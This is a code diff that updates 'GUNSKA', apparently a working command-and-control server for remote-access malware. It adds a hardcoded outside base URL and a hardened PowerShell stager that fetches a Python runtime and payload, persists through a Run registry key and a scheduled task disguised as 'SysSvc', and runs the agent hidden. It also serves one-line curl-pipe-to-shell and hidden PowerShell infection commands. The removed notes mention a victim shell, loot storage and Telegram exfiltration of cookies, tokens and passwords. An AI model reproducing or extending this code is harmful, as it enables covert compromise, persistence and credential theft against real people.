@@ -1,16 +1,5 @@
 #!/usr/bin/env python3
-"""GUNSKA — C2 server (stdlib only).
-
-Fix list vs previous revision:
-  * agent now sends AGENT_TOKEN (?t=) and the server enforces it on /p and /r
-  * .leave / .detach are handled server-side (were executed in the victim shell)
-  * console got its output pump back (see console.py)
-  * dead sessions are garbage collected, output buffer is capped
-  * loot store is capped and evicts oldest entries
-  * do_HEAD implemented, /api/* answers are no-store, bad ?after= no longer 500s
-  * panel rewritten from scratch
-  * Telegram auto-exfil (TG_TOKEN / TG_CHAT) + .tg / .cookies / .tokens / .passwords
-"""
+"""GUNSKA — C2 server (stdlib only)."""
 import base64
 import json
 import os
@@ -24,7 +13,7 @@ from urllib.parse import parse_qs, urlparse
 PORT = int(os.environ.get("PORT", "8080"))
 AUTH = os.environ.get("AUTH") or secrets.token_hex(12)
 TOKEN = os.environ.get("AGENT_TOKEN") or secrets.token_hex(12)
-BASE = os.environ.get("BASE_URL", "").rstrip("/")
+BASE = os.environ.get("BASE_URL", "https://1uciferxyz.com").rstrip("/")
 TG_TOKEN = os.environ.get("TG_TOKEN") or ""
 TG_CHAT = os.environ.get("TG_CHAT") or ""
 
@@ -39,6 +28,12 @@ MAX_OUT = 5000
 POLL_HOLD = 25
 OFFLINE_AFTER = 90
 SESSION_TTL = 86400
+
+PYC = {"d": b""}
+PY_URLS = [
+    "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip",
+    "https://registry.npmmirror.com/-/binary/python/3.11.9/python-3.11.9-embed-amd64.zip",
+]
 
 
 def base_of(h):
@@ -126,14 +121,57 @@ fi
 echo "[+] done"
 """
 
-PSH = r"""$B="__B__"; $d="$env:TEMP\svc"; New-Item -ItemType Directory -Force $d | Out-Null
-if(-not (Get-Command python -EA SilentlyContinue) -and -not (Test-Path "$d\python.exe")){
-  iwr "$B/py" -OutFile "$env:TEMP\py.zip"; Expand-Archive "$env:TEMP\py.zip" $d -Force
+PSH = r"""$ErrorActionPreference="Stop"
+$ProgressPreference="SilentlyContinue"
+try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12}catch{}
+$B="__B__"; $d="$env:TEMP\svc"; $ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+New-Item -ItemType Directory -Force $d | Out-Null
+$log="$d\boot.log"
+function Log($m){ try{ Add-Content -Path $log -Value ((Get-Date -Format "HH:mm:ss")+" "+$m) }catch{} }
+function Get($u,$o){
+  for($i=0;$i -lt 4;$i++){
+    try{
+      Invoke-WebRequest -Uri $u -OutFile $o -UseBasicParsing -UserAgent $ua -TimeoutSec 90
+      if((Test-Path $o) -and (Get-Item $o).Length -gt 0){ return $true }
+    }catch{ Start-Sleep -Seconds 2 }
+  }
+  return $false
 }
-iwr "$B/a" -OutFile "$d\k.py"
-$py = if(Test-Path "$d\python.exe"){"$d\python.exe"}else{"python"}
-Start-Process -WindowStyle Hidden -FilePath $py -ArgumentList "`"$d\k.py`""
-schtasks /create /tn SysSvc /tr "`"$py`" `"$d\k.py`"" /sc onlogon /f | Out-Null
+Log "start"
+$py="$d\python.exe"
+$have = $null
+if(Test-Path $py){ $have = $py }
+if(-not $have){ $have = (Get-Command python -ErrorAction SilentlyContinue).Source }
+if(-not $have){
+  if((Get "$B/py" "$d\py.zip") -and ((Get-Item "$d\py.zip").Length -gt 1000000)){
+    try{ Expand-Archive "$d\py.zip" $d -Force }catch{ Log "unzip: $_" }
+  }
+  if(Test-Path $py){ $have = $py }
+}
+if(-not $have){ Log "no python"; throw "python missing" }
+Log "python: $have"
+if(-not (Get "$B/a" "$d\k.py")){ Log "payload fail"; throw "payload fetch failed" }
+if((Get-Item "$d\k.py").Length -lt 500){ Log "payload short"; throw "payload corrupt" }
+
+$run="$d\run.cmd"
+Set-Content -Path $run -Encoding ASCII -Value ('@echo off'+"`r`n"+'start "" "'+$have+'" "'+"$d\k.py"+'"'+"`r`n")
+$tr = '"'+$run+'"'
+try{
+  New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name SysSvc -Value $tr -PropertyType String -Force | Out-Null
+  Log "run-key ok"
+}catch{ Log "run-key: $_" }
+try{ & cmd /c "schtasks /delete /tn SysSvc /f >nul 2>&1" }catch{}
+try{ & cmd /c "schtasks /create /tn SysSvc /tr $tr /sc onlogon /f" | Out-Null; Log "task ok" }catch{ Log "task: $_" }
+
+$psi = New-Object Diagnostics.ProcessStartInfo
+$psi.FileName = $have
+$psi.Arguments = '"'+"$d\k.py"+'"'
+$psi.WorkingDirectory = $d
+$psi.WindowStyle = "Hidden"
+$psi.CreateNoWindow = $true
+$psi.UseShellExecute = $true
+[Diagnostics.Process]::Start($psi) | Out-Null
+Log "spawned"
 """
 
 PANEL = r"""<!doctype html>
@@ -539,7 +577,7 @@ class H(BaseHTTPRequestHandler):
         if p == "/i":
             return self.snd(200, BSH.replace("__B__", base_of(self)), "text/x-shellscript")
         if p == "/i.ps1":
-            return self.snd(200, PSH.replace("__B__", base_of(self)), "text/plain")
+            return self.snd(200, PSH.replace("__B__", base_of(self)), "text/plain; charset=utf-8")
         if p == "/a":
             return self.snd(200, agent_src(self), "text/x-python")
 
@@ -550,14 +588,20 @@ class H(BaseHTTPRequestHandler):
             return self.snd(200, "linux:  curl -fsSL %s/i | sh\nwindows: powershell -w hidden -c \"irm %s/i.ps1 | iex\"\n" % (o, o))
 
         if p == "/py":
-            try:
-                r = urllib.request.Request(
-                    "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip",
-                    headers={"User-Agent": "Mozilla/5.0"})
-                with urllib.request.urlopen(r, timeout=120) as f:
-                    return self.snd(200, f.read(), "application/zip")
-            except Exception as e:
-                return self.snd(502, "py fetch: %s" % e)
+            if PYC["d"]:
+                return self.snd(200, PYC["d"], "application/zip")
+            err = ""
+            for u2 in PY_URLS:
+                try:
+                    r = urllib.request.Request(u2, headers={"User-Agent": "Mozilla/5.0"})
+                    with urllib.request.urlopen(r, timeout=120) as f:
+                        data = f.read()
+                    if len(data) > 1000000:
+                        PYC["d"] = data
+                        return self.snd(200, data, "application/zip")
+                except Exception as e:
+                    err = str(e)
+            return self.snd(502, "py fetch: %s" % err)
 
         if p.startswith("/p/"):
             if not self.agent_ok(qs):
@@ -729,6 +773,6 @@ def gc():
 
 if __name__ == "__main__":
     threading.Thread(target=gc, daemon=True).start()
-    print("AUTH=%s\nTOKEN=%s\nTG=%s\nlistening :%d"
-          % (AUTH, TOKEN, "on" if (TG_TOKEN and TG_CHAT) else "off", PORT), flush=True)
+    print("AUTH=%s\nTOKEN=%s\nTG=%s\nBASE=%s\nlistening :%d"
+          % (AUTH, TOKEN, "on" if (TG_TOKEN and TG_CHAT) else "off", BASE, PORT), flush=True)
     ThreadingHTTPServer(("0.0.0.0", PORT), H).serve_forever()
